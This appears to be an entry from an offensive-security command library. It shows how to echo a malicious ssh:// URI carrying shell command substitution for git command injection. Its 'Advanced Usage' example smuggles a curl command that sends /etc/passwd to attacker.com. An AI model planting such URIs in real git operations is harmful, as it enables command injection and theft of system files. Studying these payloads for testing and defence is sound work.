---
data: 'echo ''ssh://git@evil.com/$(whoami)'''
tags:
  - testing
  - uri
type: command
executor: bash
platforms:
  - Linux
  - Unix-like
id: 05423fcc-a1fb-4925-b296-adc9b0b960ca
created_at: '2025-12-14T17:23:42.348Z'
updated_at: '2025-12-14T17:23:42.348Z'
verified: false
validated: true
submitted: true
---
# echo-test-command

## Command

```bash
echo 'ssh://git@evil.com/$(whoami)'
```

## Description

This command tests the syntax of a malicious ssh:// URI by echoing it, helping validate injection payload formatting before use in VCS operations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo` | Built-in shell command to output string | Yes |
| `'ssh://git@evil.com/$(whoami)'` | Sample URI with injection | Yes |

## Examples

### Basic Usage

```bash
echo 'ssh://git@evil.com/$(whoami)'
```

### Advanced Usage

```bash
echo 'ssh://git@evil.com/$(curl -d @/etc/passwd attacker.com)'
```

## Expected Output

ssh://git@evil.com/$(whoami)

## Related

- [[commands/git-clone-malicious-uri]]
- [[procedures/Craft-Malicious-ssh-URI-for-Command-Injection]]
